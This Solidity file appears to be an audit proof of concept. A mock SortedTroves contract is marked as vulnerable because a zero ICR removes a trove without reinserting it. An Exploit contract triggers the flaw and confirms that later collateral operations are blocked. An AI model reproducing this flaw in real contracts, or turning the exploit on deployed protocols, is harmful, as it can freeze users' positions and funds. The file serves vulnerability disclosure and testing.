// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

contract SortedTroves {
    mapping(address => bool) public contains;

    function open(address id) external {
        contains[id] = true;
    }

    function reInsert(address _id, uint256 _newICR, uint256, address, address) external {
        require(contains[_id], "missing");
        contains[_id] = false;
        if (_newICR > 0) {
            contains[_id] = true;
        }
        // @> VULN: an ICR of zero removes the node but does not reinsert it.
    }

    function addColl(address id) external {
        require(contains[id], "sorted trove missing");
    }
}

contract Exploit {
    SortedTroves public sorted;
    bool public troveManagerBelievesExists;
    bool public blocked;
    bool public confirmed;

    constructor() {
        sorted = new SortedTroves();
    }

    function run() external {
        sorted.open(address(this));
        troveManagerBelievesExists = true;
        sorted.reInsert(address(this), 0, 0, address(0), address(0));
        try this.addCollateral() {
            revert("add collateral unexpectedly succeeded");
        } catch {
            blocked = true;
        }
        require(!sorted.contains(address(this)), "zero ICR was reinserted");
        require(troveManagerBelievesExists, "manager state changed");
        require(blocked, "future trove operation was not blocked");
        confirmed = true;
    }

    function addCollateral() external {
        sorted.addColl(address(this));
    }
}

